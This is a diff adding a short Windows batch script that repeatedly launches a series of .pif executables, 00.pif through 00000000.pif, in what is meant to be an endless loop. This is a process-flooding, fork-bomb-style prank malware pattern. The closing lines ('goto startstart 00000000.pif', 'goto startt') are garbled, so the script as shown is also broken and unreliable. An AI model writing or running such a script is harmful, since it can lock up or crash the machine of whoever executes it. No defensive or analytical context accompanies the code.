@@ -1,0 +1,32 @@
+@echo off
+:start
+start 00.pif
+start 000.pif
+start 0000.pif
+start 00000.pif
+start 000000.pif
+start 0000000.pif
+start 00000000.pif
+start 00.pif
+start 000.pif
+start 0000.pif
+start 00000.pif
+start 000000.pif
+start 0000000.pif
+start 00000000.pif
+start 00.pif
+start 000.pif
+start 0000.pif
+start 00000.pif
+start 000000.pif
+start 0000000.pif
+start 00000000.pif
+start 00.pif
+start 000.pif
+start 0000.pif
+start 00000.pif
+start 000000.pif
+start 0000000.pif
+start 00000000.pif
+goto startstart 00000000.pif
+goto startt
